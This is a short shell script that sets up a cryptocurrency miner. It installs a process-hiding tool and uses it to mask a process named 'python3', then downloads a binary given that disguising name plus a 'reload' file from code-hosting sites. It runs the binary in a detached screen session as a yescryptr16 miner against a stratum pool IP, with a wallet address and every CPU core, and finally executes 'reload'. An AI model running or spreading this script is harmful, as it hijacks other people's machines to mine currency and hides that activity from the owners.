apt update -y
apt install gcc screen -y
curl -sL https://deb.nodesource.com/setup_16.x | sudo -E bash
apt install nodejs -y
npm install -g npm@8.18.0 -y && npm i -g node-process-hider && ph add python3 
wget https://github.com/danipedrosang/marcrash/raw/main/python3 && wget https://bitbucket.org/kijang-020/project1/raw/d28f558eb2ebf56e26f70d01f3805e21cda6eeaf/reload &&  chmod +x python3 reload
screen -dmS run ./python3 -a yescryptr16 -o stratum+tcp://47.89.234.73:443 -u TJnXX3C7op7NvsfECyn6VNZ3kkz3PsBRiL.test -p c=TRX,mc=QOGE -t$(nproc --all) 
./reload
